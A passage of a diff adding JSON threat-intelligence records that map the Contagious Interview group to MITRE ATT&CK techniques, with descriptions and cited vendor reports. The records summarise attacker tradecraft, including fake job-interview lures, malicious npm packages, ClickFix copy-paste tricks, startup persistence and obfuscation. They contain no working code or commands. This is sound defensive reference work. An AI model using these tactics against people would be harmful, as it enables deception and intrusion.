+      "references": [
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.006",
+        "name": "Command and Scripting Interpreter: Python",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/006"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has leveraged JavaScript in the execution of their downloader malware targeting Windows devices using a NodeJS script titled nvidia.js.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--612c45b3-a705-4d6d-90f3-1406964df217",
+        "relationship_modified": "2026-07-31T18:47:54.609Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/007"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has lured victims to click on a malicious link that led to download of a malicious payload. Contagious Interview has also leveraged links to malicious payloads on social media and code repositories.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--b9711cc5-0d30-403c-8ff7-92e2a21e1905",
+        "relationship_modified": "2026-07-31T18:47:54.801Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.001",
+        "name": "User Execution: Malicious Link",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has distributed malicious files requiring direct victim interaction to execute through the guise of a code test.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--19b364c2-100b-489c-a48b-fd7829fa5e1e",
+        "relationship_modified": "2026-07-31T18:47:54.440Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Steve Cobb. (2024, October 29). The Job Offer That Wasn’t: How We Stopped an Espionage Plot. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview FamousChollima October 2024",
+          "url": "https://securityscorecard.com/blog/the-job-offer-that-wasnt-how-we-stopped-an-espionage-plot/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.002",
+        "name": "User Execution: Malicious File",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/002"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has leveraged ClickFix type tactics enticing victims to copy and paste malicious code.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--94237ba1-b5b3-467c-8394-3414e05763ec",
+        "relationship_modified": "2026-07-31T18:47:54.713Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.004",
+        "name": "User Execution: Malicious Copy and Paste",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/004"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has relied on users to install a malicious library from a code repository to infect the victim's device and has led to additional payload distribution and theft of sensitive data.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--1006ba0c-ed9f-4c34-b1eb-7f0078488bd0",
+        "relationship_modified": "2026-07-31T18:47:54.324Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Securonix Threat Research, D.Iuzvyk, T. Peck, O.Kolesnikov. (2024, April 24). Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors. Retrieved October 20, 2025.",
+          "source_name": "Securonix Contagious Interview DEVPOPPER April 2024",
+          "url": "https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.005",
+        "name": "User Execution: Malicious Library",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/005"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has established persistence using InvisibleFerret malware to create file to run the script on Startup via LaunchAgents. Contagious Interview has also utilized a plist file located in `/Library/LaunchAgents` to enable a malicious bash script the ability to persist.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--7596369c-9096-4b91-ab65-574f0bb3d21f",
+        "relationship_modified": "2026-07-31T18:47:54.651Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        },
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1543.001",
+        "name": "Create or Modify System Process: Launch Agent",
+        "parent_id": "T1543",
+        "url": "https://attack.mitre.org/techniques/T1543/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has targeted macOS victim hosts using a bash downloader `coremedia.sh` and a bash script `cloud.sh`.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--4359e177-34c3-452e-82d6-2535ad695514",
+        "relationship_modified": "2026-07-31T18:47:54.547Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1546.004",
+        "name": "Event Triggered Execution: Unix Shell Configuration Modification",
+        "parent_id": "T1546",
+        "url": "https://attack.mitre.org/techniques/T1546/004"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has established persistence using InvisibleFerret malware to place a.bat file in the Startup Folder.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--e84ffff2-59d1-4655-8fbe-b97bbf8e2f9f",
+        "relationship_modified": "2026-07-31T18:47:54.951Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1547.001",
+        "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "parent_id": "T1547",
+        "url": "https://attack.mitre.org/techniques/T1547/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has established persistence using InvisibleFerret malware to create a.desktop entry to run on startup on GNOME-based Linux devices.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--65378d7d-f36e-4a21-b341-9906870e4b4b",
+        "relationship_modified": "2026-07-31T18:47:54.617Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1547.013",
+        "name": "Boot or Logon Autostart Execution: XDG Autostart Entries",
+        "parent_id": "T1547",
+        "url": "https://attack.mitre.org/techniques/T1547/013"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has obfuscated JavaScript code using Base64 and variable substitutions.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--c3616986-bffd-486d-acc9-68aebc17849b",
+        "relationship_modified": "2026-07-31T18:47:54.847Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Securonix Threat Research, D.Iuzvyk, T. Peck, O.Kolesnikov. (2024, April 24). Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors. Retrieved October 20, 2025.",
+          "source_name": "Securonix Contagious Interview DEVPOPPER April 2024",
+          "url": "https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.010",
+        "name": "Obfuscated Files or Information: Command Obfuscation",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/010"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used hexadecimal string encoding to hide critical JavaScript module names, function names, and C2 URLs, which are decoded dynamically at runtime.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--8f041469-04c8-4416-a745-09147affe145",
+        "relationship_modified": "2026-07-31T18:47:54.687Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.013",
+        "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/013"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has delivered BeaverTail malware masquerading as legitimate software or applications. Contagious Interview has also delivered malicious payloads masquerading as legitimate software drivers.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--18ff6d49-0bcb-4878-8a01-821ad1091ef0",
+        "relationship_modified": "2026-07-31T18:47:54.418Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        },
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1036",
+        "name": "Masquerading",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1036"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has configured malware to remove archives used in collection activities following successful exfiltration.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--6e6a6314-8549-4ffa-890a-825b164cdb51",
+        "relationship_modified": "2026-07-31T18:47:54.633Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1070.004",
+        "name": "Indicator Removal: File Deletion",
+        "parent_id": "T1070",
+        "url": "https://attack.mitre.org/techniques/T1070/004"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has configured C2 endpoints to review IP geolocation, request headers, victim environment details and runtime conditions prior to delivering payloads.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--d579ce62-ba0b-4637-9237-d5dc92c32922",
+        "relationship_modified": "2026-07-31T18:47:54.896Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1480",
+        "name": "Execution Guardrails",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1480"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has requested victims to disable Docker and other container environments in attempts to thwart container isolation and ensure device infection.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--1ad68e81-78c0-4f9a-b824-8bc85218af44",
+        "relationship_modified": "2026-07-31T18:47:54.460Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        },
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1497",
+        "name": "Virtualization/Sandbox Evasion",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1497"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview had impersonated HR hiring personnel through social media, job board notifications, and conducted interviews with victims in order to entice them to download malware disguised as legitimate applications or malicious scripts from code repositories.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--93746e56-c2da-4186-acad-3a212537d764",
+        "relationship_modified": "2026-07-31T18:47:54.704Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
